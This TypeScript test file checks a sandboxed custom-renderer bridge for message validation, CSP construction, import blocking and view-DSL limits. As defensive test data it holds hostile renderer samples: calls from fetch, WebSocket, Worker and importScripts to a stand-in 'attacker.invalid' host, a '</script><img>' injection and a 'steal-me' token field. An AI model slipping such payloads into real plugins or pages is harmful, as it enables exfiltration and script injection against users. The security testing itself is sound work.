import { describe, expect, it } from 'vitest'
import { normalizeCustomRendererSource } from '@/api/services/custom-renderer-api'
import {
  buildCustomRendererSrcdoc,
  customRendererInitEnvelope,
  normalizeCustomRendererView,
  readCustomRendererBridgeMessage,
  type CustomRendererIdentityV1,
} from './custom-renderer-bridge'

const digest = 'a'.repeat(64)
const manifestDigest = 'b'.repeat(64)
const nonce = 'c'.repeat(48)
const sourceWindow = {} as WindowProxy
const identity: CustomRendererIdentityV1 = {
  plugin_id: 'com.example.cards',
  plugin_version: '1.0.0',
  renderer_id: 'card-custom',
  renderer_digest: digest,
  node_id: 'node-one',
  node_revision: 4,
}

function message(type: string, extra: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    bridge_version: 1,
    type,
    nonce,
    ...identity,
    ...extra,
  }
}

function read(data: unknown, overrides: Partial<{ source: MessageEventSource | null; origin: string }> = {}) {
  return readCustomRendererBridgeMessage({
    source: overrides.source === undefined ? sourceWindow : overrides.source,
    origin: overrides.origin ?? 'https://ui.homerail.test',
    data,
  }, {
    source: sourceWindow,
    origin: 'https://ui.homerail.test',
    identity,
    nonce,
    action_ids: new Set(['approve']),
  })
}

describe('custom Renderer trusted-iframe/Worker Bridge', () => {
  it('accepts only the closed message vocabulary with exact identities', () => {
    expect(read(message('homerail.custom-renderer.ready'))).toEqual({
      type: 'homerail.custom-renderer.ready',
      ...identity,
    })
    expect(read(message('homerail.custom-renderer.resize', { height: 420 }))).toMatchObject({
      type: 'homerail.custom-renderer.resize',
      height: 420,
    })
    expect(read(message('homerail.custom-renderer.action', { action_id: 'approve' }))).toMatchObject({
      type: 'homerail.custom-renderer.action',
      action_id: 'approve',
    })
    expect(read(message('homerail.custom-renderer.error', { message: 'safe failure' }))).toMatchObject({
      type: 'homerail.custom-renderer.error',
      message: 'safe failure',
    })
  })

  it.each([
    ['foreign window', message('homerail.custom-renderer.ready'), { source: {} as WindowProxy }],
    ['foreign origin', message('homerail.custom-renderer.ready'), { origin: 'https://attacker.invalid' }],
    ['missing nonce', (() => { const value = message('homerail.custom-renderer.ready'); delete value.nonce; return value })(), {}],
    ['wrong nonce', { ...message('homerail.custom-renderer.ready'), nonce: 'wrong' }, {}],
    ['wrong plugin', { ...message('homerail.custom-renderer.ready'), plugin_id: 'com.attacker.plugin' }, {}],
    ['wrong version', { ...message('homerail.custom-renderer.ready'), plugin_version: '2.0.0' }, {}],
    ['wrong renderer', { ...message('homerail.custom-renderer.ready'), renderer_id: 'other' }, {}],
    ['wrong digest', { ...message('homerail.custom-renderer.ready'), renderer_digest: 'd'.repeat(64) }, {}],
    ['wrong node', { ...message('homerail.custom-renderer.ready'), node_id: 'node-two' }, {}],
    ['stale revision', { ...message('homerail.custom-renderer.ready'), node_revision: 3 }, {}],
    ['unknown field', { ...message('homerail.custom-renderer.ready'), admin_token: 'steal-me' }, {}],
    ['raw parent message', { type: 'homerail.custom-renderer.action', action_id: 'approve' }, {}],
    ['undeclared Action', message('homerail.custom-renderer.action', { action_id: 'delete_everything' }), {}],
    ['oversized frame', message('homerail.custom-renderer.resize', { height: 2001 }), {}],
    ['oversized error', message('homerail.custom-renderer.error', { message: 'x'.repeat(501) }), {}],
  ] as const)('rejects %s', (_label, data, overrides) => {
    expect(read(data, overrides)).toBeUndefined()
  })

  it('builds a trusted bootstrap document with deny-by-default CSP and inert source embedding', () => {
    const hostile = `export async function render(payload){
      location.href='https://attacker.invalid/navigation-leak';
      fetch('https://attacker.invalid/fetch-leak');
      new XMLHttpRequest(); new WebSocket('wss://attacker.invalid');
      new Worker('https://attacker.invalid/recursive-worker.js');
      importScripts('https://attacker.invalid/classic-loader.js');
      return { view_version: 1, root: {
        type: 'button', label: '</script><img src=https://attacker.invalid>', action_id: 'approve'
      } };
    }`
    const srcdoc = buildCustomRendererSrcdoc({
      source: hostile,
      nonce,
      identity,
      parent_origin: 'https://ui.homerail.test',
    })
    expect(srcdoc).toContain("default-src 'none'")
    expect(srcdoc).toContain("connect-src 'none'")
    expect(srcdoc).toContain('worker-src blob:')
    expect(srcdoc).toContain(`script-src 'nonce-${nonce}' blob:`)
    expect(srcdoc).toContain(`style-src 'nonce-${nonce}'`)
    expect(srcdoc).toContain(`script nonce="${nonce}"`)
    expect(srcdoc).toContain(`style nonce="${nonce}"`)
    expect(srcdoc).toContain("Object.defineProperty(globalThis, name, { value: undefined")
    expect(srcdoc).toContain("'Worker','SharedWorker','importScripts'")
    expect(srcdoc).toContain('new Worker(workerUrl')
    expect(srcdoc).toContain('new Blob([value.source]')
    expect(srcdoc).toContain('if (!event.isTrusted')
    expect(srcdoc).not.toContain('moduleRender({ root')
    expect(srcdoc).not.toContain('const bridge = Object.freeze')
    expect(srcdoc).not.toContain('</script><img src=https://attacker.invalid>')
    expect(srcdoc).toContain('\\u003c/script>\\u003cimg src=https://attacker.invalid>')
  })

  it('rejects language-level module loaders before an iframe or Worker is created', () => {
    for (const hostile of [
      `import value from 'https://attacker.invalid/static.js'; export function render() { return value }`,
      `export async function render() { return import('https://attacker.invalid/dynamic.js') }`,
      `export function render() { return { view_version: 1, root: { type: 'text', text: 'ok' } } }
       export * from 'https://attacker.invalid/re-export.js'`,
    ]) {
      expect(() => buildCustomRendererSrcdoc({
        source: hostile,
        nonce,
        identity,
        parent_origin: 'https://ui.homerail.test',
      })).toThrow(/imports are forbidden|exactly one named render export/)
    }
  })

  it('normalizes only the exact bounded box/text/button view DSL', () => {
    const view = {
      view_version: 1,
      root: {
        type: 'box', direction: 'column', gap: 'md', align: 'stretch', children: [
          { type: 'text', text: 'Review this card', variant: 'title' },
          { type: 'button', label: 'Approve', action_id: 'approve', variant: 'primary' },
        ],
      },
    }
    expect(normalizeCustomRendererView(view, new Set(['approve']))).toEqual(view)
    expect(() => normalizeCustomRendererView({
      view_version: 1,
      root: { type: 'text', text: 'unsafe', html: '<img src=x>' },
    }, new Set())).toThrow(/fields/)
    expect(() => normalizeCustomRendererView({
      view_version: 1,
      root: { type: 'text', text: 'unsafe', url: 'https://attacker.invalid' },
    }, new Set())).toThrow(/fields/)
    expect(() => normalizeCustomRendererView({
      view_version: 1,
      root: { type: 'button', label: 'Delete', action_id: 'delete_everything' },
    }, new Set(['approve']))).toThrow(/not allowed/)
    expect(() => normalizeCustomRendererView({
      view_version: 1,
      root: { type: 'text', text: 'x'.repeat(2_001) },
    }, new Set())).toThrow(/field limit/)
  })

  it('creates an immutable parent init envelope without sharing caller objects', () => {
    const payload = {
      node: { id: 'node-one', revision: 4 },
      placement: { node_id: 'node-one' },
      context: { device: 'desktop' },
    } as never
    const envelope = customRendererInitEnvelope(identity, nonce, payload, ['approve', 'approve']) as {
      action_ids: string[];
      payload: { node: { id: string } };
    }
    payload.node.id = 'mutated'
    expect(envelope).toMatchObject({
      type: 'homerail.custom-renderer.init',
      nonce,
      node_id: 'node-one',
      action_ids: ['approve'],
      payload: { node: { id: 'node-one' } },
    })
  })

  it('strictly binds Manager source responses to the projected identity', () => {
    const expected = {
      plugin_id: identity.plugin_id,
      plugin_version: identity.plugin_version,
      manifest_digest: manifestDigest,
      renderer_id: identity.renderer_id,
      file: 'ui/card.mjs',
      digest,
    }
    const response = {
      bridge_api: 1,
      renderer_api: 1,
      ...expected,
      media_type: 'text/javascript',
      content: 'export function render(payload) { return { view_version: 1, root: { type: "text", text: String(payload?.node?.id || "ok") } } }',
    }
    expect(normalizeCustomRendererSource(response, expected)).toEqual(response)
    expect(() => normalizeCustomRendererSource({ ...response, plugin_id: 'com.attacker' }, expected))
      .toThrow(/identity mismatch/)
    expect(() => normalizeCustomRendererSource({ ...response, extra: true }, expected))
      .toThrow(/fields/)
  })
})
